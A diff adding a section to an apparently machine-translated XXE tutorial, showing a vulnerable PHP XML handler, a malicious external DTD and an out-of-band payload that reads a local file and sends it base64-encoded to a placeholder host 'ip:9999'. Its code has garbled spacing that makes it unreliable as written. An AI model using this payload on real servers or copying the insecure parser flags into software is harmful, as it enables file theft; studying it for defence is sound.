@@ -146,3 +146,34 @@ The content of combine.dtd is:
 Explanation:   
 A basic entity is defined in combine.dtd above, which references 3 parameter entities:% param1 ;,% param2 ;,% param3 ;.    
 The parsed `<foo>…</foo>` content is Hello World.    
+
+
+### The Calling Process 
+
+xml.php
+```
+<? php
+
+libxml_disable_entity_loader (false); 
+$ xmlfile = file_get_contents ('php: // input'); 
+$ dom = new DOMDocument (); 
+$ dom-> loadXML ($ xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?>
+```
+
+test.dtd 
+```
+<! ENTITY% file SYSTEM "php: //filter/read=convert.base64-encode/resource=file: /// D: /test.txt"> 
+<! ENTITY% int "<! ENTITY% send SYSTEM 'http : // ip: 9999? p =% file; '> ">
+```  
+
+payload: 
+```
+<! DOCTYPE convert [ 
+<! ENTITY% remote SYSTEM "http: //ip/test.dtd">
+% remote;% int;% send;
+]>
+```
+from payloads we have three parameter `entities%` `remote;%` `int;% send;` are called consecutively. This is our order of use .% Remote is called first, and after calling it requests test.dtd on the remote server, which is similar to Include test.dtd, then% int calls% file in test.dtd, and% file will get the sensitive files on the server, and then fill the result of% file into% send (because the value of the entity cannot be %, So it is converted to html entity encoding &#37;), we then call% send; and send our read data to our remote vps, so that the effect of the out-of-band data is achieved, and the XXE is perfectly solved No echo issues.   
+![issue1](https://user-images.githubusercontent.com/25066959/70174277-8e87d100-16a2-11ea-98dd-7770b56fa049.PNG)
+  
